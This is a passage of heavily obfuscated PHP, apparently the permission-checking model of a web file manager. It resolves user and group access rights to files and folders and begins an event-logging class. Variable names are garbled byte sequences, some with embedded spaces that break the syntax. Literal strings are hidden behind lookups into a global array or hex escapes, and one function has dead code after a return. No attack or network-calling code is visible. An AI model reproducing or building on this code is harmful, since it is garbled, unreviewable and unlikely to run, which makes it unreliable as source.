$éßëÅ‘Í[$å‰ÙüöË[0]] = $íÂîËŸ¡->sourceInfo($å‰ÙüöË[0]); } if (!$éßëÅ‘Í) { $³Ò¿öíÎ = array($¢İÕ¢æÕ[459] => array($¢İÕ¢æÕ[460], $å‰ÙüöË)); $éßëÅ‘Í = $íÂîËŸ¡->field($¢İÕ¢æÕ[2076])->where($³Ò¿öíÎ)->select(); $éßëÅ‘Í = array_to_keyvalue($éßëÅ‘Í, $¢İÕ¢æÕ[181]); } $×—¹®ÀÓ = $å‰ÙüöË; foreach ($éßëÅ‘Í as $í¨‡áéÓ => $¢¶ı½Ü) { $Ÿ¼¿Î‰é = $íÂîËŸ¡->parentLevelArray($¢¶ı½Ü[$¢İÕ¢æÕ[554]]); $×—¹®ÀÓ = array_merge($×—¹®ÀÓ, array($í¨‡áéÓ), array_reverse($Ÿ¼¿Î‰é)); } $×—¹®ÀÓ = array_values(array_unique($×—¹®ÀÓ)); if (!$×—¹®ÀÓ) { return array(); } $Ûéº¿ìİ = $this->sourceAuthSelect($×—¹®ÀÓ); $í’øê¬ = array(); foreach ($×—¹®ÀÓ as $çÀü±”) { if (isset($Ûéº¿ìİ[$çÀü±”])) { $í’øê¬[$çÀü±”] = $Ûéº¿ìİ[$çÀü±”]; } } $ÁéçÓÚ³ = $this->userIsRoot($º²Ä€ß¼); $åÄ«±€ = AuthModel::authAll(); $§ö®ìÆÕ = array($¢İÕ¢æÕ[456] => $åÄ«±€, $¢İÕ¢æÕ[2077] => array($¢İÕ¢æÕ[461] => 0, $¢İÕ¢æÕ[1894] => $åÄ«±€, $¢İÕ¢æÕ[462] => LNG($¢İÕ¢æÕ[2078]), $¢İÕ¢æÕ[1911] => $¢İÕ¢æÕ[2079])); $Ùªæãğô = array(); foreach ($éßëÅ‘Í as $çÀü±” => $à¹Ñ×Ø¼) { if ($ÁéçÓÚ³ && $GLOBALS[$¢İÕ¢æÕ[6]][$¢İÕ¢æÕ[1907]]) { $Ùªæãğô[$çÀü±”] = $§ö®ìÆÕ; continue; } $Ùªæãğô[$çÀü±”] = $this->makeSourceAuth($à¹Ñ×Ø¼, $í’øê¬, $º²Ä€ß¼); } return $Ùªæãğô; } public function authDeepCheck($Ò¾®€³È, $¿‹Œ °„ = false) { $¹Ÿº‘Ö =& $_SERVER[³½¬ÚË¯]; $¿‹Œ °„ = $¿‹Œ °„ ? $¿‹Œ °„ : USER_ID; $¹àğ€î¦ = $this->makeAuthDeep($¿‹Œ °„); if (!in_array($Ò¾®€³È, $¹àğ€î¦[$¹Ÿº‘Ö[2080]])) { return !1; } $ÖêíÓÃ‹ = array(); foreach ($¹àğ€î¦[$¹Ÿº‘Ö[2081]] as $â‘Ö²°È => $Ã†¨¼ø™) { if (!in_array($Ò¾®€³È, $Ã†¨¼ø™)) { continue; } $ÖêíÓÃ‹[] = $â‘Ö²°È; } if (!$ÖêíÓÃ‹) { return !1; } $ç¼ÇÒüè = $ÖêíÓÃ‹ ? $ÖêíÓÃ‹[0] : $Ò¾®€³È; return array($¹Ÿº‘Ö[456] => -1, $¹Ÿº‘Ö[508] => array($¹Ÿº‘Ö[461] => $¹Ÿº‘Ö[1231], $¹Ÿº‘Ö[1894] => $¹Ÿº‘Ö[212], $¹Ÿº‘Ö[462] => LNG($¹Ÿº‘Ö[2082]), $¹Ÿº‘Ö[1911] => $¹Ÿº‘Ö[2083]), $¹Ÿº‘Ö[2084] => LNG($¹Ÿº‘Ö[2085]), $¹Ÿº‘Ö[2086] => $this->sourceAuthInfo($ç¼ÇÒüè)); } protected function makeAuthDeep($ Œü ¼ = false) { $É‚÷Ù²Ï =& $_SERVER[³½¬ÚË¯]; static $·´šÎ°´ = array(); $ Œü ¼ = $ Œü ¼ ? $ Œü ¼ : USER_ID; if (isset($·´šÎ°´[$ Œü ¼])) { return $·´šÎ°´[$ Œü ¼]; } $ÅÕØ§ñ¸ = Model($É‚÷Ù²Ï[2087])->listData(); $¡²ƒ¶Ú = array(); foreach ($ÅÕØ§ñ¸ as $ ´¬¡Á®) { if ($ ´¬¡Á®[$É‚÷Ù²Ï[455]] == 0 && $ ´¬¡Á®[$É‚÷Ù²Ï[1910]] == $É‚÷Ù²Ï[88]) { $¡²ƒ¶Ú[] = $ ´¬¡Á®[$É‚÷Ù²Ï[443]]; } } $£Æ÷å‡ = $this->userGroupParents($ Œü ¼); $ø¦¬ÇÀË = array($É‚÷Ù²Ï[178] => SourceModel::TYPE_USER, $É‚÷Ù²Ï[539] => $ Œü ¼); if ($£Æ÷å‡) { $ø¦¬ÇÀË = array(array($É‚÷Ù²Ï[178] => SourceModel::TYPE_USER, $É‚÷Ù²Ï[539] => $ Œü ¼), array($É‚÷Ù²Ï[178] => SourceModel::TYPE_GROUP, $É‚÷Ù²Ï[539] => array($É‚÷Ù²Ï[460], $£Æ÷å‡)), $É‚÷Ù²Ï[1043] => $É‚÷Ù²Ï[1986]); } $²ñï¼± = $this->field($É‚÷Ù²Ï[2088])->where($ø¦¬ÇÀË)->select(); $¦ÕÒÀºñ = array(); $ïÇÍå¾Î = array_to_keyvalue_group($²ñï¼±, $É‚÷Ù²Ï[181]); foreach ($ïÇÍå¾Î as $±Ş±¿æü => $ŠŞê¨) { $ŞóÌ­»ğ = $this->authArrayCheck($ŠŞê¨, $ Œü ¼); if ($ŞóÌ­»ğ[$É‚÷Ù²Ï[456]] > 0) { $¦ÕÒÀºñ[] = $±Ş±¿æü . $É‚÷Ù²Ï[12]; } } if ($£Æ÷å‡) { $àş×û´ä = Model($É‚÷Ù²Ï[555]); foreach ($£Æ÷å‡ as $£Ì¬“Âã) { $×£Ç£ = $àş×û´ä->getInfo($£Ì¬“Âã); if (!$×£Ç£ || !is_array($×£Ç£[$É‚÷Ù²Ï[87]])) { continue; } $¦ÕÒÀºñ[] = $×£Ç£[$É‚÷Ù²Ï[87]][$É‚÷Ù²Ï[181]]; } } $Õ«şÈ‰’ = array(); $­¾ì€‚ì = $£Æ÷å‡; $³ù†¨ = Model($É‚÷Ù²Ï[1375]); $àş×û´ä = Model($É‚÷Ù²Ï[555]); $¸ÉŞ‚Û› = array(); $„¿‡ğš´ = array(); $­ÒÆù½« = array(); $²›¨×¡Ò = array(); if ($¦ÕÒÀºñ) { $”ø¤°Ä½ = $³ù†¨->where(array($É‚÷Ù²Ï[181] => array($É‚÷Ù²Ï[460], $¦ÕÒÀºñ)))->select(); foreach ($”ø¤°Ä½ as $œ‘¸¬î) { $¹‘ÀÅ¾Æ = $³ù†¨->parentLevelArray($œ‘¸¬î[$É‚÷Ù²Ï[554]]); $Õ«şÈ‰’ = array_merge($Õ«şÈ‰’, $¹‘ÀÅ¾Æ); $­¾ì€‚ì[] = $œ‘¸¬î[$É‚÷Ù²Ï[539]]; $¸ÉŞ‚Û›[$œ‘¸¬î[$É‚÷Ù²Ï[181]]] = $¹‘ÀÅ¾Æ; $„¿‡ğš´[$œ‘¸¬î[$É‚÷Ù²Ï[181]]] = $œ‘¸¬î[$É‚÷Ù²Ï[539]]; } } $­¾ì€‚ì = array_values(array_unique($­¾ì€‚ì)); $‘¿²Ÿ»‰ = $­¾ì€‚ì; foreach ($‘¿²Ÿ»‰ as $£Ì¬“Âã) { $×£Ç£ = $àş×û´ä->getInfo($£Ì¬“Âã); $¹‘ÀÅ¾Æ = $³ù†¨->parentLevelArray($×£Ç£[$É‚÷Ù²Ï[554]]); $­¾ì€‚ì = array_merge($­¾ì€‚ì, $¹‘ÀÅ¾Æ); } $­¾ì€‚ì = array_values(array_unique($­¾ì€‚ì)); foreach ($­¾ì€‚ì as $£Ì¬“Âã) { $×£Ç£ = $àş×û´ä->getInfo($£Ì¬“Âã); $Õ«şÈ‰’[] = $×£Ç£[$É‚÷Ù²Ï[87]][$É‚÷Ù²Ï[181]]; $­ÒÆù½«[$£Ì¬“Âã] = $×£Ç£[$É‚÷Ù²Ï[87]][$É‚÷Ù²Ï[181]]; $²›¨×¡Ò[$£Ì¬“Âã] = $³ù†¨->parentLevelArray($×£Ç£[$É‚÷Ù²Ï[554]]); } foreach ($¸ÉŞ‚Û› as $Ú¸¨õüÈ => $ÜÅ¬µİÀ) { $îÓ‡¿¯ = $„¿‡ğš´[$Ú¸¨õüÈ]; if (!$îÓ‡¿¯ || !$­ÒÆù½«[$îÓ‡¿¯]) { continue; } $ÍÅº¨ãœ = array(); foreach ($²›¨×¡Ò[$îÓ‡¿¯] as $£Ì¬“Âã) { $ÍÅº¨ãœ[] = $­ÒÆù½«[$£Ì¬“Âã]; } $¸ÉŞ‚Û›[$Ú¸¨õüÈ] = array_merge($ÍÅº¨ãœ, $ÜÅ¬µİÀ); } $Õ«şÈ‰’ = array_values(array_unique($Õ«şÈ‰’)); $¸áÁù°É = array($É‚÷Ù²Ï[2080] => $Õ«şÈ‰’, $É‚÷Ù²Ï[2081] => $¸ÉŞ‚Û›); $·´šÎ°´[$ Œü ¼] = $¸áÁù°É; return $¸áÁù°É; } private function makeSourceAuth($Ÿ‘êÚ€Ó, $”˜÷€üÔ, $ŸÏĞ‡ä = false) { $«°ä£µç =& $_SERVER[³½¬ÚË¯]; $õ“ÔáËç = $«°ä£µç[88]; $†ÀûÍµ¸ = $Ÿ‘êÚ€Ó[$«°ä£µç[539]]; $ÂıîİÀ† = $Ÿ‘êÚ€Ó[$«°ä£µç[178]] == SourceModel::TYPE_GROUP; $±õ¦­Ø = $ÂıîİÀ† ? $this->groupRootAuth($†ÀûÍµ¸, $ŸÏĞ‡ä) : !1; if ($±õ¦­Ø && Model($«°ä£µç[541])->authCheckAction($±õ¦­Ø[$«°ä£µç[455]], $«°ä£µç[1909])) { return $this->groupAuthInfo($±õ¦­Ø, $†ÀûÍµ¸); } $áĞ¯Ÿ½è = Model($«°ä£µç[1375])->parentLevelArray($Ÿ‘êÚ€Ó[$«°ä£µç[554]]); $áĞ¯Ÿ½è = array_merge(array($Ÿ‘êÚ€Ó[$«°ä£µç[181]]), array_reverse($áĞ¯Ÿ½è)); $Èıùˆ½ = !1; foreach ($áĞ¯Ÿ½è as $Í‡Ë®ì) { if (!isset($”˜÷€üÔ[$Í‡Ë®ì])) { continue; } $‡è¦Äƒ = $this->authMake($”˜÷€üÔ[$Í‡Ë®ì], $ŸÏĞ‡ä); if ($‡è¦Äƒ[$«°ä£µç[508]]) { $Èıùˆ½ = $‡è¦Äƒ; break; } } if (!$ÂıîİÀ†) { return $Èıùˆ½; } if (!$Èıùˆ½ && $±õ¦­Ø) { $Èıùˆ½ = $this->groupAuthInfo($±õ¦­Ø, $†ÀûÍµ¸); } if (!$Èıùˆ½) { $Ò‘¿„œµ = Model($«°ä£µç[555])->getInfo($†ÀûÍµ¸); $Ü˜®Ÿ¢é = explode($«°ä£µç[50], trim($Ò‘¿„œµ[$«°ä£µç[554]], $«°ä£µç[50])); $Ü˜®Ÿ¢é = array_reverse($Ü˜®Ÿ¢é); foreach ($Ü˜®Ÿ¢é as $¶«¡Àı¶) { if ($¶«¡Àı¶ == $«°ä£µç[212] || $¶«¡Àı¶ == $õ“ÔáËç) { continue; } $ˆ·çÆÚ = $this->groupRootAuth($¶«¡Àı¶, $ŸÏĞ‡ä); if (!$ˆ·çÆÚ) { continue; } $Èıùˆ½ = $this->groupAuthInfo($ˆ·çÆÚ, $¶«¡Àı¶); break; } } if (!$Èıùˆ½ || $Èıùˆ½[$«°ä£µç[456]] <= 0) { $«ìŠËÄï = $this->authDeepCheck($Ÿ‘êÚ€Ó[$«°ä£µç[181]], $ŸÏĞ‡ä); if ($«ìŠËÄï) { $Èıùˆ½ = $«ìŠËÄï; } } return $Èıùˆ½; } private function userIsRoot($±¬ôàìÃ = false) { $Û»»ÅÁ€ =& $_SERVER[³½¬ÚË¯]; if (!$±¬ôàìÃ && _get($GLOBALS, $Û»»ÅÁ€[537])) { return !0; } $ËªÄæò‘ = Model($Û»»ÅÁ€[568])->getInfo($±¬ôàìÃ); $ù›ŠÚûø = Model($Û»»ÅÁ€[2089])->listData($ËªÄæò‘[$Û»»ÅÁ€[1565]]); if ($ù›ŠÚûø && $ù›ŠÚûø[$Û»»ÅÁ€[545]][$Û»»ÅÁ€[2090]] == 1) { return !0; } return !1; } private function sourceAuthInfo($öñš³ü) { $è€ì“Çè =& $_SERVER[³½¬ÚË¯]; $Ó›æß´ = Model($è€ì“Çè[1375]); $›š¤™öë = $Ó›æß´->sourceInfo($öñš³ü); if (!$›š¤™öë) { return !1; } $Ó›æß´->groupPathDisplay($›š¤™öë); $á®Ôôìˆ = array($›š¤™öë); $á®Ôôìˆ = $Ó›æß´->_listAppendPath($á®Ôôìˆ); $›š¤™öë = $á®Ôôìˆ[0]; $ÔÀé  = $›š¤™öë[$è€ì“Çè[552]]; if (isset($›š¤™öë[$è€ì“Çè[560]])) { $€Í”¦üİ = explode($è€ì“Çè[8], trim($›š¤™öë[$è€ì“Çè[552]], $è€ì“Çè[8])); array_shift($€Í”¦üİ); $ÔÀé  = $›š¤™öë[$è€ì“Çè[558]] . $è€ì“Çè[2091] . implode($è€ì“Çè[8], $€Í”¦üİ); } return array($è€ì“Çè[462] => $›š¤™öë[$è€ì“Çè[32]], $è€ì“Çè[84] => KodIO::make($›š¤™öë[$è€ì“Çè[181]]), $è€ì“Çè[2092] => $ÔÀé ); } private function groupAuthInfo($ôºÛ£ğÍ, $˜®Ñôñç) { $ôúŒƒÏù =& $_SERVER[³½¬ÚË¯]; $±†ÈÖÙ¶ = Model($ôúŒƒÏù[555])->getInfo($˜®Ñôñç); return array($ôúŒƒÏù[2093] => intval($ôºÛ£ğÍ[$ôúŒƒÏù[455]]), $ôúŒƒÏù[2077] => $ôºÛ£ğÍ, $ôúŒƒÏù[2094] => LNG($ôúŒƒÏù[2095]), $ôúŒƒÏù[2086] => array($ôúŒƒÏù[462] => $±†ÈÖÙ¶[$ôúŒƒÏù[32]], $ôúŒƒÏù[84] => KodIO::make($±†ÈÖÙ¶[$ôúŒƒÏù[87]][$ôúŒƒÏù[181]]), $ôúŒƒÏù[2092] => $±†ÈÖÙ¶[$ôúŒƒÏù[559]])); } protected function groupRootAuth($¦ë–±»ß, $²â‹íÅ = false) { $ÉçìÛİƒ =& $_SERVER[³½¬ÚË¯]; $²â‹íÅ = $²â‹íÅ ? $²â‹íÅ : USER_ID; $¨™‹šÉ— = $²â‹íÅ . $ÉçìÛİƒ[2096] . $¦ë–±»ß; static $•êğ–ç’ = array(); if (isset($•êğ–ç’[$¨™‹šÉ—])) { return $•êğ–ç’[$¨™‹šÉ—]; } $´‘ÔÕÑú = Model($ÉçìÛİƒ[555])->getInfo($¦ë–±»ß); $ƒ®Ø–ô = $this->userGroupList($²â‹íÅ); $Ú•œ€Âí = isset($ƒ®Ø–ô[$¦ë–±»ß]) ? $ƒ®Ø–ô[$¦ë–±»ß][$ÉçìÛİƒ[455]] : !1; if ($Ú•œ€Âí && Model($ÉçìÛİƒ[541])->authCheckAction($Ú•œ€Âí[$ÉçìÛİƒ[455]], $ÉçìÛİƒ[1909])) { $•êğ–ç’[$¨™‹šÉ—] = $Ú•œ€Âí; return $Ú•œ€Âí; } $Ù–şØÚœ = $this->sourceAuthSelect($´‘ÔÕÑú[$ÉçìÛİƒ[87]][$ÉçìÛİƒ[181]]); $¢ ‘É± = $Ù–şØÚœ ? $this->authMake($Ù–şØÚœ, $²â‹íÅ) : !1; $‰ßÅÛï¹ = $¢ ‘É± ? $¢ ‘É±[$ÉçìÛİƒ[508]] : !1; $•êğ–ç’[$¨™‹šÉ—] = $‰ßÅÛï¹ ? $‰ßÅÛï¹ : $Ú•œ€Âí; return $•êğ–ç’[$¨™‹šÉ—]; } public function authOwnerApply($¡ö„¢Èä) { $‚ıòËá =& $_SERVER[³½¬ÚË¯]; if (empty($¡ö„¢Èä[$‚ıòËá[455]]) || isset($¡ö„¢Èä[$‚ıòËá[2097]]) && $¡ö„¢Èä[$‚ıòËá[2097]]) { return $¡ö„¢Èä; } if (AuthModel::authCheckRoot($¡ö„¢Èä[$‚ıòËá[455]][$‚ıòËá[456]])) { return $¡ö„¢Èä; } $İöÇÂÜ = Model($‚ıòËá[1375])->parentLevelArray($¡ö„¢Èä[$‚ıòËá[554]]); $İöÇÂÜ = array_merge(array($¡ö„¢Èä[$‚ıòËá[181]]), array_reverse($İöÇÂÜ)); $Îñ˜ÑĞş = $this->sourceAuthSelect($İöÇÂÜ); $ìÓËÖĞâ = array(); $‰Îó€˜¨ = array(); foreach ($Îñ˜ÑĞş as $»û›÷¼â => $à˜Ğ©·¹) { $ÇØ”ã³ = $this->authFolderOwnerUser($à˜Ğ©·¹); $ìÓËÖĞâ[$»û›÷¼â] = $ÇØ”ã³; $‰Îó€˜¨ = array_merge($‰Îó€˜¨, $ÇØ”ã³[$‚ıòËá[631]]); if ($ÇØ”ã³[$‚ıòËá[2098]]) { break; } } if (count($‰Îó€˜¨) == 0) { $‰Îó€˜¨ = $this->authFolderOwnerGroup($¡ö„¢Èä[$‚ıòËá[539]]); } $‰Îó€˜¨ = array_unique($‰Îó€˜¨); if (AuthModel::authCheckRoot($¡ö„¢Èä[$‚ıòËá[455]][$‚ıòËá[456]])) { $‰Îó€˜¨[] = USER_ID; } $¡ö„¢Èä[$‚ıòËá[455]][$‚ıòËá[2099]] = Model($‚ıòËá[547])->userListInfo($‰Îó€˜¨); return $¡ö„¢Èä; } private function authFolderOwnerGroup($ğø•¨Ê˜) { $´ãø»ı =& $_SERVER[³½¬ÚË¯]; $ÉÍµûŒ¢ = Model($´ãø»ı[1978])->where(array($´ãø»ı[1888] => $ğø•¨Ê˜))->select(); $‚ùÂ½† = array(); if (!$ÉÍµûŒ¢) { return $‚ùÂ½†; } foreach ($ÉÍµûŒ¢ as $­×Ğ«ú×) { $øóÑ¬ƒ· = $this->authInfo($­×Ğ«ú×); if (AuthModel::authCheckRoot($øóÑ¬ƒ·[$´ãø»ı[455]])) { $‚ùÂ½†[] = $­×Ğ«ú×[$´ãø»ı[1690]]; } } return $‚ùÂ½†; } private function authFolderOwnerUser($Œìü£’Ã) { $ÙÑª‡õÀ =& $_SERVER[³½¬ÚË¯]; $ÄŠÅ‹´Ù = array(); $êàúœ¢Ó = !1; foreach ($Œìü£’Ã as $¢ŒÊÏ¾æ) { $Ø¿üô = $this->authInfo($¢ŒÊÏ¾æ); if ($¢ŒÊÏ¾æ[$ÙÑª‡õÀ[539]] == $ÙÑª‡õÀ[212]) { $êàúœ¢Ó = !0; } if ($¢ŒÊÏ¾æ[$ÙÑª‡õÀ[178]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ø¿üô[$ÙÑª‡õÀ[455]])) { $ÄŠÅ‹´Ù[] = $¢ŒÊÏ¾æ[$ÙÑª‡õÀ[539]]; } } } return array($ÙÑª‡õÀ[631] => $ÄŠÅ‹´Ù, $ÙÑª‡õÀ[2098] => $êàúœ¢Ó); } public function authMake($˜İÌÍğ, $ç•¦ÏŞ¼ = false) { $çÇùªã =& $_SERVER[³½¬ÚË¯]; $°Áâ“™“ = $this->authArrayCheck($˜İÌÍğ, $ç•¦ÏŞ¼); if ($°Áâ“™“[$çÇùªã[2100]]) { $°Áâ“™“[$çÇùªã[2100]] = $this->sourceAuthInfo($°Áâ“™“[$çÇùªã[2100]]); } return $°Áâ“™“; } public function authArrayCheck($¶ÆÕ×­Ø, $Û´Î‚šù = false) { $È‚°òÜÕ =& $_SERVER[³½¬ÚË¯]; if (!$¶ÆÕ×­Ø) { return array($È‚°òÜÕ[456] => 0, $È‚°òÜÕ[508] => !1); } $Û´Î‚šù = $Û´Î‚šù ? $Û´Î‚šù : USER_ID; $ÔÚìŞÈñ = 0; $¥ë†¦± = 0; $øâËè´Ç = 0; $ìí™Š¬» = 0; $’Ü¼âŸ = 0; $æ©Œ“ÛÓ = 0; $À˜™¿ÜÖ = 1000; $¯êˆõŠ = 0; $æ’Áá©Ö = 0; $½è´ò†É = 0; $ßÒ€€Œ  = 0; $Ğ©ˆâš« = array($È‚°òÜÕ[181] => 0); foreach ($¶ÆÕ×­Ø as $Ğ©ˆâš«) { $Šîìœ´ = $this->authInfo($Ğ©ˆâš«); if (!$Šîìœ´) { continue; } $ñˆß¢Õ× = $Ğ©ˆâš«[$È‚°òÜÕ[539]]; $ûª¤èá = intval($Šîìœ´[$È‚°òÜÕ[455]]); if ($Ğ©ˆâš«[$È‚°òÜÕ[178]] == SourceModel::TYPE_USER && $ñˆß¢Õ× == $Û´Î‚šù) { $ÔÚìŞÈñ = !0; $øâËè´Ç = $Šîìœ´; $¥ë†¦± = $ûª¤èá; } else { if ($Ğ©ˆâš«[$È‚°òÜÕ[178]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ñˆß¢Õ×, $Û´Î‚šù)) { $ìí™Š¬» = !0; $Î¦£´ƒ = $this->groupStepToUserGroup($ñˆß¢Õ×, $Û´Î‚šù); if ($Î¦£´ƒ < $À˜™¿ÜÖ) { $À˜™¿ÜÖ = $Î¦£´ƒ; $’Ü¼âŸ = $ûª¤èá; $æ©Œ“ÛÓ = $Šîìœ´; $¯êˆõŠ = $ñˆß¢Õ×; } if ($Î¦£´ƒ == $À˜™¿ÜÖ && $ûª¤èá >= $’Ü¼âŸ) { $’Ü¼âŸ = $ûª¤èá; $æ©Œ“ÛÓ = $Šîìœ´; $¯êˆõŠ = $ñˆß¢Õ×; } } else { if ($ñˆß¢Õ× == $È‚°òÜÕ[212]) { $æ’Áá©Ö = !0; $ßÒ€€Œ  = $Šîìœ´; $½è´ò†É = $ûª¤èá; } } } } if ($ÔÚìŞÈñ) { $ØıÀ´± = $¥ë†¦±; $Šîìœ´ = $øâËè´Ç; $ÙÒ£øıÈ = LNG($È‚°òÜÕ[2101]); } else { if ($ìí™Š¬») { $ØıÀ´± = $’Ü¼âŸ; $Šîìœ´ = $æ©Œ“ÛÓ; $ßÙô¿Ââ = Model($È‚°òÜÕ[555])->getInfo($¯êˆõŠ); $ÙÒ£øıÈ = $È‚°òÜÕ[163] . $ßÙô¿Ââ[$È‚°òÜÕ[559]] . $È‚°òÜÕ[2102] . LNG($È‚°òÜÕ[2103]); } else { if ($æ’Áá©Ö) { $ØıÀ´± = $½è´ò†É; $Šîìœ´ = $ßÒ€€Œ ; $ÙÒ£øıÈ = LNG($È‚°òÜÕ[2074]); } else { $ØıÀ´± = 0; $Šîìœ´ = !1; $ÙÒ£øıÈ = $È‚°òÜÕ[12]; } } } $–‘Àïïû = array($È‚°òÜÕ[2093] => intval($ØıÀ´±), $È‚°òÜÕ[2077] => $Šîìœ´, $È‚°òÜÕ[2094] => $ÙÒ£øıÈ, $È‚°òÜÕ[2086] => $Ğ©ˆâš«[$È‚°òÜÕ[181]]); return $–‘Àïïû; } private function groupContainUser($Ñõ³ÉÉ, $è–’¯ş× = false) { return in_array($Ñõ³ÉÉ, $this->userGroupParents($è–’¯ş×)); } private function groupStepToUserGroup($ôÍàÓÈ, $û¼Ó··â = false) { $Â¼éÇ¹ç =& $_SERVER[³½¬ÚË¯]; $«ç­ŠçÉ = $this->userGroupList($û¼Ó··â); $É§ßÊÇã = 1000; $ç§…ˆ£â = $GLOBALS[$Â¼éÇ¹ç[6]][$Â¼éÇ¹ç[89]][$Â¼éÇ¹ç[1991]] == 1; $ÕÊÃ§„Ø = $ç§…ˆ£â ? 3 : 2; foreach ($«ç­ŠçÉ as $’òÏ¶ì…) { if ($’òÏ¶ì…[$Â¼éÇ¹ç[1888]] == $ôÍàÓÈ) { return 0; } $À¡Ù—ò = explode($Â¼éÇ¹ç[50], trim($’òÏ¶ì…[$Â¼éÇ¹ç[554]], $Â¼éÇ¹ç[50])); if ($À¡Ù—ò[0] == $Â¼éÇ¹ç[212] && count($À¡Ù—ò) > $ÕÊÃ§„Ø) { $—öÅñÊã = array_reverse(array_slice($À¡Ù—ò, $ÕÊÃ§„Ø)); $õ˜ñ·Ô = array_search($ôÍàÓÈ, $—öÅñÊã); if ($õ˜ñ·Ô !== !1 && $õ˜ñ·Ô + 1 <= $É§ßÊÇã) { $É§ßÊÇã = $õ˜ñ·Ô + 1; } } } return $É§ßÊÇã; } private function userGroupList($½¼Åòë’ = false) { $¬İÀ×– =& $_SERVER[³½¬ÚË¯]; static $·ä™‰ = array(); if (isset($·ä™‰[$½¼Åòë’])) { return $·ä™‰[$½¼Åòë’]; } $åÅÃğñ = Model($¬İÀ×–[568])->getInfo($½¼Åòë’); $·ä™‰[$½¼Åòë’] = array_to_keyvalue($åÅÃğñ[$¬İÀ×–[2075]], $¬İÀ×–[1888]); return $·ä™‰[$½¼Åòë’]; } public function userGroupParents($ìĞ‡ÖËº) { $šÓ¦ÙÊ” =& $_SERVER[³½¬ÚË¯]; static $¯Ï½µ…ä = array(); $ìĞ‡ÖËº = $ìĞ‡ÖËº ? $ìĞ‡ÖËº : USER_ID; if (isset($¯Ï½µ…ä[$ìĞ‡ÖËº])) { return $¯Ï½µ…ä[$ìĞ‡ÖËº]; } $ü¶‡ª€Ã = $this->userGroupList($ìĞ‡ÖËº); $²É£”Ë° = array(); $Ú·Òù¥× = $GLOBALS[$šÓ¦ÙÊ”[6]][$šÓ¦ÙÊ”[89]][$šÓ¦ÙÊ”[1991]] == 1; $ıÆÓ˜—ˆ = $Ú·Òù¥× ? 3 : 2; foreach ($ü¶‡ª€Ã as $ï¡«‘öì) { $ıÑï¸¤ó = array($ï¡«‘öì[$šÓ¦ÙÊ”[1888]]); $ÁÓ¤‘ç‰ = explode($šÓ¦ÙÊ”[50], trim($ï¡«‘öì[$šÓ¦ÙÊ”[554]], $šÓ¦ÙÊ”[50])); if ($ÁÓ¤‘ç‰[0] == $šÓ¦ÙÊ”[212] && count($ÁÓ¤‘ç‰) > $ıÆÓ˜—ˆ) { $ˆ¬û—ã¾ = array_slice($ÁÓ¤‘ç‰, $ıÆÓ˜—ˆ); $ıÑï¸¤ó = array_merge($ıÑï¸¤ó, array_reverse($ˆ¬û—ã¾)); } $²É£”Ë° = array_merge($²É£”Ë°, $ıÑï¸¤ó); } $¯Ï½µ…ä[$ìĞ‡ÖËº] = array_unique($²É£”Ë°); return $¯Ï½µ…ä[$ìĞ‡ÖËº]; } public function authTargetInfoMake($Ä‡Œ©¸›) { $ Âš¶ˆ =& $_SERVER[³½¬ÚË¯]; $‰®ˆáÔ½ = array(); $ØÉ”ò™ = array(); foreach ($Ä‡Œ©¸› as $ŠªĞü×°) { if ($ŠªĞü×°[$ Âš¶ˆ[178]] == SourceModel::TYPE_USER) { $‰®ˆáÔ½[] = intval($ŠªĞü×°[$ Âš¶ˆ[539]]); } else { if ($ŠªĞü×°[$ Âš¶ˆ[178]] == SourceModel::TYPE_GROUP) { $ØÉ”ò™[] = intval($ŠªĞü×°[$ Âš¶ˆ[539]]); } } } if ($‰®ˆáÔ½) { $‰®ˆáÔ½ = Model($ Âš¶ˆ[547])->userListInfo($‰®ˆáÔ½); } if ($ØÉ”ò™) { $ïƒÄâŸê = array($ Âš¶ˆ[1976] => array($ Âš¶ˆ[460], $ØÉ”ò™)); $ØÉ”ò™ = Model($ Âš¶ˆ[555])->field($ Âš¶ˆ[2104])->where($ïƒÄâŸê)->select(); $ØÉ”ò™ = array_to_keyvalue($ØÉ”ò™, $ Âš¶ˆ[1888]); } return array($ Âš¶ˆ[2105] => $‰®ˆáÔ½, $ Âš¶ˆ[2106] => $ØÉ”ò™); } public function authInfo($ÚÑÁÒä’) { $õÌ´İ®³ =& $_SERVER[³½¬ÚË¯]; if ($ÚÑÁÒä’[$õÌ´İ®³[1992]]) { $³áôÕ› = Model($õÌ´İ®³[541])->listData($ÚÑÁÒä’[$õÌ´İ®³[1992]]); if (!$³áôÕ›) { return !1; $‡•†¦ªÓ = Model($õÌ´İ®³[541])->listData(); $­·æì¹ = array_filter_by_field($‡•†¦ªÓ, $õÌ´İ®³[455], $õÌ´İ®³[212]); return $­·æì¹; } $™»¥¤ïî = array_field_key($³áôÕ›, array($õÌ´İ®³[443], $õÌ´İ®³[32], $õÌ´İ®³[455], $õÌ´İ®³[1911], $õÌ´İ®³[1912])); $™»¥¤ïî[$õÌ´İ®³[2107]] = $ÚÑÁÒä’; return $™»¥¤ïî; } else { return array($õÌ´İ®³[461] => 0, $õÌ´İ®³[1894] => $ÚÑÁÒä’[$õÌ´İ®³[2052]], $õÌ´İ®³[462] => $õÌ´İ®³[12], $õÌ´İ®³[1911] => $õÌ´İ®³[2108]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\143\x65\x5f\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\x69\x6d\145", "\x74\x69\155\x65", "\151\156\163\145\162\x74", "\x66\165\x6e\x63\164\x69\157\156"), array("\144\x65\163\143", '', "\x69\x6e\x73\x65\x72\164\54\165\x70\x64\141\x74\145\54\x73\x65\154\145\x63\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($°œÅ½í², $Ú‘­¥Ê·, $ŸõÕ¡ª§ = '') { $ıæö¥¡Û =& $_SERVER[³½¬ÚË¯]; if (!$this->eventSave) { return; } $±˜–¬´ñ = Model($ıæö¥¡Û[1375])->sourceInfo($°œÅ½í²); if (!$±˜–¬´ñ) { return !1; } if ($this->isCacheEvent($±˜–¬´ñ, $Ú‘­¥Ê·)) { return; } if ($ŸõÕ¡ª§ && is_string($ŸõÕ¡ª§)) { $ŸõÕ¡ª§ = array($ıæö¥¡Û[1927] => $ŸõÕ¡ª§); } $â¶ÏµÜÅ = defined($ıæö¥¡Û[2109]) ? USER_ID : 0; $Ä°ò¹¾é = array($ıæö¥¡Û[459] => $°œÅ½í², $ıæö¥¡Û[2110] 